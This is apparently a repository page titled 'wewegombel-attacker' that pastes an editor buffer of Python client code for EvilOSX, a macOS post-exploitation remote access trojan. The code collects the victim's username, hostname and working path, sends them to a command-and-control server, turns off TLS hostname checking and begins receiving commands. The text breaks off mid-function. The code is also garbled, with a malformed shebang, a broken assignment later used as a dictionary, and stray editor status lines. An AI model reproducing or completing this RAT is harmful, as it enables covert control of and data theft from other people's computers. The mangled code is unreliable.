## Welcome to wewegombel-attacker

##usr/bin/env python                                                                     # -*- coding: utf-8 -*-                                                                   """EvilOSX is a pure python, post-exploitation, RAT (Remote Administration Tool) for macOS / OSX."""
# Random Hash: This text will be replaced when building WeWeGomBel-Attacker               __author__ = "godeyes"                                                                    __license__ = "GPLv3"
__version__ = "2.1.2"                                                                                                                                                               import time
import urllib2
import urllib                                                                             import random
import getpass
import uuid
import subprocess
import threading
import traceback
import os
import json
import base64
from StringIO import StringIO
import sys
import ssl
import logging                                                                            
SERVER_HOST = "127.0.0.1"
SERVER_PORT = 1337                                                                        PROGRAM_DIRECTORY = os.path.expanduser("")  # The program directory where EvilOSX lives (s
tores files).
LOADER_OPTIONS = "php")  # Loader options, used to remove/update this payload later.

COMMAND_INTERVAL = 0.5  # Interval in seconds to check for commands.                      IDLE_TIME = 60  # Time in seconds after which the client will become idle.

MESSAGE_INFO = "\033[94m" + "[I] " + "\033[0m"                                            MESSAGE_ATTENTION = "\033[91m" + "[!] " + "\033[0m"

# Loggingi                                                                                logging.basicConfig(format="[%(levelname)s] %(funcName)s:%(lineno)s - %(message)s", level=
logging.DEBUG)
log = logging.getLogger(__name__)


def receive_command():
    """Receives a command to execute from the server.

    :return A command object.
    """
    request_path = "https://%s:%s/api/get_command" % (SERVER_HOST, SERVER_PORT)
    headers = {"User-Agent": _get_random_user_agent()}

    username = run_command("whoami")
    hostname = run_command("hostname")
    current_path = run_command("pwd")

    # Send the server some basic information about this client.
    data = urllib.urlencode(
        {"client_id": get_uid(), "username": username, "hostname": hostname,
         "remote_ip": get_remote_ip(), "path": current_path, "loader": LOADER_OPTIONS["loa
der_name"]}                                                                                   )
                                                                                              # Don't check the hostname when validating the CA.
    ssl.match_hostname = lambda cert, hostname: True

    request = urllib2.Request(url=request_path, headers=headers, data=data)
    response = urllib2.urlopen(request, cafile=get_ca_file())

    response_line = response.readline().replace("\n", "")  # Can't be read twice.
    response_headers = response.info().dict

    if "content-disposition" in response_headers and "attachment" in response_headers["con
tent-disposition"]:
WeweGombel.py [+]                                                          54,64     Top
-- INSERT --
